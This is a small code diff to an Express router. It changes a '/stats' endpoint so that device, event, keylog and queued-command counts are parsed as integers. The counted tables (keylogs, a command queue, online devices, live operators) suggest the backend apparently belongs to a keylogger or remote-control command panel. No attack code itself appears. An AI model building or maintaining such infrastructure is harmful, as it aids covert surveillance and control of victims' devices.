@@ -164,11 +164,11 @@ router.get('/stats', async (_, res) => {
     get(`SELECT COUNT(*) n FROM cmd_queue`),
   ]);
   res.json({
-    total_devices:  total?.n  || 0,
-    online_devices: online?.n || 0,
-    total_events:   evts?.n   || 0,
-    total_keylogs:  kls?.n    || 0,
-    queued_cmds:    queued?.n  || 0,
+    total_devices:  parseInt(total?.n)  || 0,
+    online_devices: parseInt(online?.n) || 0,
+    total_events:   parseInt(evts?.n)   || 0,
+    total_keylogs:  parseInt(kls?.n)    || 0,
+    queued_cmds:    parseInt(queued?.n)  || 0,
     live_operators: require('../core/hub').operators.size,
   });
 });
@@ -311,3 +311,4 @@ router.get('/detections', async (req, res) => {
 });
 
 module.exports = router;
+    
